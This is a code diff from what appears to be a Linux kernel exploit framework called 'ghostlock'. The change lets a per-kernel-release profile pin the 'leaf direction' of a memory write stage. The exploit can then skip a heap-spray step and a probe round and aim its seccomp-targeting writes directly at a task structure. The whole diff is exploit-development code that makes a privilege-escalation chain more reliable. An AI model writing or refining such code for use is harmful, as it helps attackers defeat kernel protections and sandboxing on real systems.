@@ -151,8 +151,16 @@ namespace ghostlock::session::backend {
          * later is fd-only work. Failure is not fatal -- W3-0 falls back to
          * spraying one itself. */
             support::run_state::enter("w2p");
-            if (!support::prepare_prebuilt_leaf_page(
-                    child_task + ghostlock::profile::task_comm_off())) {
+            /* A profile that pins W3-0's leaf direction also removes the probe
+             * route that would activate this page, so spraying it would buy a
+             * page nothing consumes -- skip the KernelSnitch scan entirely. */
+            const auto pinned_leaf_direction =
+                g_exploit_session.profile.select_stack_layout().w3_leaf_to_target8;
+            if (pinned_leaf_direction.has_value()) {
+                pr_info("W3-0 leaf direction pinned by profile (%u); skipping leaf page spray\n",
+                        static_cast<unsigned>(*pinned_leaf_direction));
+            } else if (!support::prepare_prebuilt_leaf_page(
+                           child_task + ghostlock::profile::task_comm_off())) {
                 pr_warning("W3-0 prebuilt page unavailable; W3-0 will spray its own\n");
             }
             support::run_state::complete("w2p");
@@ -298,18 +306,31 @@ namespace ghostlock::session::backend {
             };
             if (!exact_target) {
                 support::run_state::enter("w3a");
-                Status dir_ok = retry_write_stage<M>(
-                    session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
-                    victim::verify_leaf_dir_stage, &w3_context, 1);
-                if (!dir_ok) {
-                    /* U01/S14: upstream retires the child instead of guessing the leaf
-                 * direction and blind-writing the task neighbour. Returning false
-                 * hands control back to the W2/W3 chain, which parks this child and
-                 * spawns a fresh one for the next round. */
-                    pr_warning("W3 leaf direction probe failed; retiring child\n");
-                    return false;
+                const auto pinned_leaf =
+                    g_exploit_session.profile.select_stack_layout().w3_leaf_to_target8;
+                if (pinned_leaf.has_value()) {
+                    /* The release pins where the leaf write lands, so the probe
+                     * route (one full write round) is unnecessary: aim both
+                     * seccomp writes directly and keep the route budget for the
+                     * writes that actually matter. */
+                    w3_context.leaf_to_target8 = *pinned_leaf != 0 ? 1 : 0;
+                    pr_info("W3-0 leaf direction pinned by profile: %s\n",
+                            w3_context.leaf_to_target8 ? "[target+8]" : "[target]");
+                    support::run_state::complete("w3a");
+                } else {
+                    Status dir_ok = retry_write_stage<M>(
+                        session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(),
+                        1, 4, 50000, victim::verify_leaf_dir_stage, &w3_context, 1);
+                    if (!dir_ok) {
+                        /* U01/S14: upstream retires the child instead of guessing the leaf
+                     * direction and blind-writing the task neighbour. Returning false
+                     * hands control back to the W2/W3 chain, which parks this child and
+                     * spawns a fresh one for the next round. */
+                        pr_warning("W3 leaf direction probe failed; retiring child\n");
+                        return false;
+                    }
+                    support::run_state::complete("w3a");
                 }
-                support::run_state::complete("w3a");
             } else {
                 support::run_state::complete("w3a");
             }
